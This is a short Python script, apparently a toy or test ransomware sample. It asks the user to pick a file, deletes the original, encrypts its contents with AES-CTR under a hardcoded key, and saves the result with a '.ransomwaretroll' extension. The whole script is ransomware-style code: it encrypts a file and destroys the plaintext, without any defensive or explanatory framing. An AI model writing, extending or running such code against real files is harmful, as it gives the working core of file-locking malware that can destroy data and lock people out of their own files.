import os
import pyaes
from tkinter import Tk
from tkinter.filedialog import askopenfilename

def encrypt_file(file_path, key):
    ## Reads the file
    with open(file_path, 'rb') as file:
        file_data = file.read()

    ## Removes the original file
    os.remove(file_path)

    ## Initializes AES encryption
    aes = pyaes.AESModeOfOperationCTR(key)

    ## Encrypt the file data
    crypto_data = aes.encrypt(file_data)

    ## Saves the encrypted file
    new_file_path = file_path + '.ransomwaretroll'
    with open(new_file_path, 'wb') as new_file:
        new_file.write(crypto_data)
    print(f'File "{file_path}" encrypted and saved as "{new_file_path}"')

if __name__ == "__main__":
    ## Asks user to select a file
    Tk().withdraw() 
    file_path = askopenfilename(title="Select a file to encrypt")

    if not file_path:
        print("No file selected. Exiting.")
    else:
        ## Key for encryption
        key = b'testeransomwares'
        encrypt_file(file_path, key)
